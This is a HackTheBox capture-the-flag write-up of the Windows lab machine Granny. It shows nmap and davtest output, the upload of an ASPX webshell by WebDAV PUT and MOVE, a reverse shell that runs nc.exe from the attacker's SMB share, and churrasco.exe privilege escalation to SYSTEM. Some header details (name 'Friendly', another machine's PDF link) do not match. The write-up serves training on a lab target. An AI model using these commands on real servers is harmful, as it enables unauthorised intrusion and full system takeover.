---
title: Granny HTB (English)
image: /assets/img/Anexos/Máquina%20Granny.png
description: Granny HackTheBox Machine [Difuculty easy]
categories: [CTF,HackTheBox]
tags: [hacking,easy]
---



## Introduction

 Granny, while similar to Grandpa, can be exploited using several different methods. The intended method of solving this machine is the widely-known Webdav upload vulnerability. 

### Machine Description

![](/assets/img/Anexos/Máquina%20Granny-11.png)

- Name: Friendly
- Goal: Get two flags
- Difficulty: easy
- Operating System: Windows
- link: [Granny](https://app.hackthebox.com/machines/14/activity)


### PDF Link
- PDF: [PDF Link](https://github.com/juanbelin/Writeups-CTFs-Challenges/blob/main/Hackmyvm/M%C3%A1quina%20Friendly.pdf)



## Reconnaissance 




We start scanning the host using `nmap` in order to know ports and services running:
```shell
nmap -sS --min-rate=5000 -p- --open -Pn -n 10.10.10.15 -oN ports.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 16:53 CEST
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 17.30% done; ETC: 16:53 (0:00:19 remaining)
Nmap scan report for 10.10.10.15
Host is up (0.046s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds
```
Nmap report us only the port _80_ open:

![](/assets/img/Anexos/Máquina%20Granny-1.png)


```shell
❯ nmap -sCV -p80 -Pn 10.10.10.15 -oN scan1.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 16:55 CEST
Nmap scan report for 10.10.10.15
Host is up (0.039s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Sun, 13 Apr 2025 14:55:06 GMT
|   WebDAV type: Unknown
|_  Server Type: Microsoft-IIS/6.0
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Doing a version scanning for that port I can realize that it's using IIS and the methods **PUT** and **MOVE** are enabled.


So lets try to upload the _scan1.txt_ using `curl`
```shell
curl -T 'scan1.txt' 'http://10.10.10.15'
```

![](/assets/img/Anexos/Máquina%20Granny-2.png)

It works!, Now lets using `davtest` in order to know which can of extensions can be uploaded
```shell
❯ davtest -url http://10.10.10.15/
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.15
********************************************************
NOTE	Random string for this session: dpBdObd8PSUw
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_dpBdObd8PSUw
********************************************************
 Sending test files
PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.php
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.txt
PUT	asp	FAIL
PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.pl
PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.cfm
PUT	shtml	FAIL
PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.html
PUT	cgi	FAIL
PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.jsp
PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.jhtml
PUT	aspx	FAIL
********************************************************
 Checking for test file execution
EXEC	php	FAIL
EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.txt
EXEC	pl	FAIL
EXEC	cfm	FAIL
EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.html
EXEC	jsp	FAIL
EXEC	jhtml	FAIL

********************************************************
davtest.pl Summary:
Created: http://10.10.10.15/DavTestDir_dpBdObd8PSUw
PUT File: http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.php
PUT File: http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.txt
PUT File: http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.pl
PUT File: http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.cfm
PUT File: http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.html
PUT File: http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.jsp
PUT File: http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.jhtml
Executes: http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.txt
Executes: http://10.10.10.15/DavTestDir_dpBdObd8PSUw/davtest_dpBdObd8PSUw.html
```

For now we cannot upload an _.aspx_ extension which is the one we're interested for. 

What we can do know is make the _cmd.aspx_, then change it to txt, upload it , and finally since MOVE is enabled we change the name again:

## Explotation 
```shell
cp /usr/share/webshells/aspx/cmdasp.aspx .
cp cmdasp.aspx cmdasp.txt
```

Using `cadaver` I transfer the txt:
```shell
dav:/> put cmdasp.txt 
Uploading cmdasp.txt to `/cmdasp.txt':
Progress: [=============================>] 100.0% of 1400 bytes succeeded.
```

```shell
❯ curl -X MOVE --header 'Destination:http://10.10.10.15/cmdasp.aspx' 'http://10.10.10.15/cmdasp.txt'
```

![](/assets/img/Anexos/Máquina%20Granny-3.png)

Now using `impacket` I share `nc`.
```shell
❯ cp /usr/share/wordlists/seclists/Web-Shells/FuzzDB/nc.exe .
❯ ls
 nc.exe
❯ smbserver.py smbFolder $(pwd) -smb
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

While I'm sharing `nc` and I listening on the port 4444, I run a reverse shell to my attacker machine:
```shell
\\10.10.16.6\smbFolder\nc.exe 10.10.16.6 4444 -e cmd.exe
```


![](/assets/img/Anexos/Máquina%20Granny-4.png)

![](/assets/img/Anexos/Máquina%20Granny-5.png)
## Privilage escalation 
We can see the next sys information:
```shell
C:\>systeminfo
systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 57 Minutes, 26 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 735 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,282 MB
Page File: In Use:         188 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```

Also as a user we have this dangerous privilage:
![](/assets/img/Anexos/Máquina%20Granny-6.png)

To exploit it, I use the next poc:

> https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/

I transfer `churrasco.exe` to the victim machine using `impacket`: 
![](/assets/img/Anexos/Máquina%20Granny-7.png)
We have to specify the command we want to run:

```shell
C:\WINDOWS\Temp>.\churrasco.exe "whoami"
.\churrasco.exe "whoami"
nt authority\system
```

The same process as before but using `churrasco` in order to be authority system:  

![](/assets/img/Anexos/Máquina%20Granny-8.png)

![](/assets/img/Anexos/Máquina%20Granny-9.png)